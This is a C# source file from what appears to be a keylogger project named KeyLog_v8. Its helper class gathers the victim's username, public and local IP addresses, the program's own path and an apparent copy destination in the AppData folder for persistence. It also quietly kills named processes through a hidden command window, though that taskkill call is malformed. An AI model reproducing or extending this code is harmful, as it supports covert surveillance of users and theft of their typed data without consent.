using System;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Diagnostics;

namespace KeyLog_v8
{
    class Information
    {
        public string Username;
        public string AppCopiedName;
        public string AppCopiedDirection;
        public string AppStartedName;
        public string AppStartedDirection;
        public string InternetIp;

        public Information(string appName){
            Username = System.Windows.Forms.SystemInformation.UserName;
            AppCopiedName = appName;
            AppCopiedDirection = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
            AppStartedName = Path.GetFileName(Application.ExecutablePath);
            AppStartedDirection = Path.GetDirectoryName(Application.ExecutablePath) + "\\";
        }

        public string IpOgrenInternet()
        {
            try
            {
                WebClient client = new WebClient();
                string htmlCode = client.DownloadString("http://checkip.dyndns.org/");
                string[] a1 = htmlCode.Split(':');
                string a2 = a1[1].Substring(1);
                string[] a3 = a2.Split('<');
                string a4 = a3[0];
                //Console.WriteLine(a4);
                return a4;
            }
            catch
            {
                return "0.0.0.0";
            }
        }

        public string IpOgrenLocal()
        {
            if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                return "0.0.0.0";
            }

            IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "0.0.0.0";
        }

        public int UygulamaKapatici(String appName)
        {
            Process[] procs = Process.GetProcessesByName(appName);
            if (procs.Length == 0)
                return 0;
            int procsCount = procs.Length;

            Process processCmd = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "taskkill /MI " + appName;
            processCmd.StartInfo = startInfo;
            processCmd.Start();

            procs = Process.GetProcessesByName(appName);
            if (procsCount == procs.Length)
                return 2;
            else if (procs.Length == 0)
                return 1;
            else
                return 3;
        }
    }
}
